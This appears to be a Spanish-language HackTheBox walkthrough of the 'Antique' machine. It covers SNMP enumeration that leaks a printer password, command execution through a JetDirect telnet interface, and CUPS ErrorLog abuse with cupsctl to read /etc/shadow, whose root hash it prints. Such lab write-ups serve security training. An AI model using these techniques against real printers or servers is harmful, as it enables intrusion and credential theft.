---
title: HTB - Antique
published: true
categories: [Linux]
tags: [eJPT, Fácil]
---


<img src="/assets/HTB/Antique/antique.png">


¡Hola!
Vamos a resolver de la máquina `Antique` de dificultad "Fácil" de la plataforma [HackTheBox](https://hackthebox.com/).

Técnicas Vistas: 

- **SNMP Enumeration**
- **Network Printer Abuse**
- **CUPS Administration Exploitation (ErrorLog)**


### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `Antique`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 10.10.11.107
PING 10.10.11.107 (10.10.11.107) 56(84) bytes of data.
64 bytes from 10.10.11.107: icmp_seq=1 ttl=63 time=38.3 ms

--- 10.10.11.107 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 38.334/38.334/38.334/0.000 ms
```
Identificamos que es una maquina **Linux** debido a su ttl (time to live) correspondiente a 63 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```java
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.107 -oG allPorts

PORT   STATE SERVICE REASON
23/tcp open  telnet  syn-ack ttl 63
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```bash
nmap -sCV -p23 10.10.11.107 -oN targeted

PORT   STATE SERVICE VERSION
23/tcp open  telnet?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
|     JetDirect
|     Password:
|   NULL: 
|_    JetDirect
```

Únicamente observamos el puerto 23 abierto que parece corresponder a una imprsora HP conectada en red. Ante la escasez de puertos por TCP procedemos a realizar un escaneo por `UDP`

```bash
nmap -sU --top-ports 100 --open -T5 -v -n 10.10.11.107 -oN udp

PORT    STATE SERVICE
161/udp open  snmp
```

Observamos puerto 161 abierto con el servicio `snmp`. Utilizaremos la herramienta `snmpwalk` para el reconocimiento de este puerto

### Enumeración SNMP

* * *

Empezamos con la enumeración básica por SNMP

```bash
❯ snmpwalk -v 2c -c public 10.10.11.107
iso.3.6.1.2.1 = STRING: "HTB Printer"
```
Sabemos que snmpwalk tiene una estructura como de árbol en donde por defecto busca a partir del segundo nodo por decirlo de alguna forma

```bash
If no OID argument is present, snmpwalk will search the subtree rooted at SNMPv2-SMI::mib-2 (including any MIB object values from other MIB modules, that are defined as  lying
within  this subtree).  If the network entity has an error processing the request packet, an error packet will be returned and a message will be shown, helping to pinpoint why
the request was malformed.
```

Indicándole un 1 al final del comando anterior nos arroja algo más de información

```bash
❯ snmpwalk -v 2c -c public 10.10.11.107 1
iso.3.6.1.2.1 = STRING: "HTB Printer"
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 
iso.3.6.1.4.1.11.2.3.9.1.2.1.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

Observamos una cadena de datos que está aparentemente en Hexadecimal. Procedemos a descodificar la cadena obtenida con `xxd` y obtenemos una credencial

```bash
❯ echo "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135" | xargs | xxd -ps -r
P@ssw0rd@123!!123q"2Rbs3CSs$4EuWGW(8i	IYaA"1&1A5#
```

Probamos a ussar esta credencial conectándonos por telnet a la máquina víctima con la credencial obtenida

```bash
❯ telnet 10.10.11.107
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: P@ssw0rd@123!!123q"2Rbs3CSs$4EuWGW(8i

Please type "? for HELP
>?
To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session
```
Listando la ayuda de la sesión en telnet nos percatamos de la opción de poder ejecutar el comando `exec`. Probamos ejecutando un par de comandos

```bash
> exec id
uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
> exec ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.107  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::250:56ff:fe96:387  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:fe96:387  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:96:03:87  txqueuelen 1000  (Ethernet)
        RX packets 136070  bytes 8691510 (8.6 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 132474  bytes 7181043 (7.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 22  bytes 1936 (1.9 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 22  bytes 1936 (1.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Nos ponemos en escucha en el puerto 443 y ejecutamos el comando en bash para entablarnos una reverse shell con la máquina víctima

<img src="/assets/HTB/Antique/revshell.png">

Localizamos la flag de usuario en el mismo directorio donde hemos ganado acceso

```bash
lp@antique:~$ cat user.txt 
0b7cbc14bdf1cea9f****************
```

### Escalada Privilegios

* * *

Enumerando puerto internos abiertos encontramos el puerto 631 abierto

```bash
lp@antique:~$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN     
tcp        0      2 10.10.11.107:34068     10.10.14.41:443         ESTABLISHED
tcp        0      0 10.10.11.107:23        10.10.14.41:60444       ESTABLISHED
tcp6       0      0 ::1:631                 :::*                    LISTEN     
```

Mediante la herramienta `chisel` haremos un Remote Port Forwarding para poder examinar el contenido de este puerto en nuestro equipo

<img src="/assets/HTB/Antique/chisel.png">

Ahora podemos abrir el contenido en nuestro equipo a través de `localhost:631`

<img src="/assets/HTB/Antique/cups.png">

tras una búsqueda en Google descubrimos que las versiones de CUPS anteriores a la 1.6.2 son vulnerables a lectura de archivos locales. Navegamos a `Administración` y vemos que clickando en `Ver archivo de registro de errores` muestra el contenido del archivo `error.log`. Como CUPS funciona con root como predeterminado la lectura arbitraria de archivos puede ser acontecida actualiando el path `ErrorLog`. Para ello usamos `cupsctl`

```bash
cupsctl ErrorLog="/etc/shadow"
```
Ahora mediante una petición curl a View Error Log nos revela el contenido de `/etc/shadow`

```bash
lp@antique:/tmp$ curl http://localhost:631/admin/log/error_log
root:$6$UgdyXjp3KC.86MSD$sMLE6Yo9Wwt636DSE2Jhd9M5hvWoy6btMs.oYtGQp7x4iDRlGCGJg8Ge9NO84P5lzjHN1WViD3jqX/VMw4LiR.:18760:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
sync:*:18375:0:99999:7:::
games:*:18375:0:99999:7:::
man:*:18375:0:99999:7:::
lp:*:18375:0:99999:7:::
mail:*:18375:0:99999:7:::
news:*:18375:0:99999:7:::
uucp:*:18375:0:99999:7:::
proxy:*:18375:0:99999:7:::
www-data:*:18375:0:99999:7:::
backup:*:18375:0:99999:7:::
list:*:18375:0:99999:7:::
irc:*:18375:0:99999:7:::
gnats:*:18375:0:99999:7:::
nobody:*:18375:0:99999:7:::
systemd-network:*:18375:0:99999:7:::
systemd-resolve:*:18375:0:99999:7:::
systemd-timesync:*:18375:0:99999:7:::
messagebus:*:18375:0:99999:7:::
syslog:*:18375:0:99999:7:::
_apt:*:18375:0:99999:7:::
tss:*:18375:0:99999:7:::
uuidd:*:18375:0:99999:7:::
tcpdump:*:18375:0:99999:7:::
landscape:*:18375:0:99999:7:::
pollinate:*:18375:0:99999:7:::
systemd-coredump:!!:18389::::::
lxd:!:18389::::::
usbmux:*:18891:0:99999:7:::
```

De la misma forma podemos acceder a la flag de root de la máquina

```bash
cupsctl ErrorLog="/root/root.txt"

lp@antique:/tmp$ curl http://localhost:631/admin/log/error_log
e82e5d4f14cc6b491***************
```

Hemos completado la máquina **Antique** de HackTheBox!! Happy Hacking!!


<img src="/assets/HTB/Antique/pwned.png">
